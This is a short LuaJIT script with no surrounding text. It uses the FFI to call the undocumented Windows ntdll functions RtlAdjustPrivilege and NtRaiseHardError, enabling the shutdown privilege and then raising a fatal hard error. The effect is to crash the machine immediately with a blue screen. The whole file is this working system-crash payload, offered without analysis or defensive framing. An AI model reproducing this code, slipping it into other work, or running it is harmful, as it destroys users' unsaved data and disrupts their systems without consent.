local ffi = require("ffi")

ffi.cdef[[
    int RtlAdjustPrivilege(unsigned int Privilege, unsigned char Enable, unsigned char CurrentThread, unsigned char* Enabled);
    int NtRaiseHardError(unsigned int ErrorStatus, unsigned int NumberOfParameters, unsigned int UnicodeStringParameterMask, void* Parameters, unsigned int ValidResponseOptions, unsigned int* Response);
]]

local ntdll = ffi.load("ntdll")

local enabled = ffi.new("unsigned char[1]")
local response = ffi.new("unsigned int[1]")

ntdll.RtlAdjustPrivilege(19, 1, 0, enabled)
ntdll.NtRaiseHardError(0xC0000420, 0, 0, nil, 6, response)

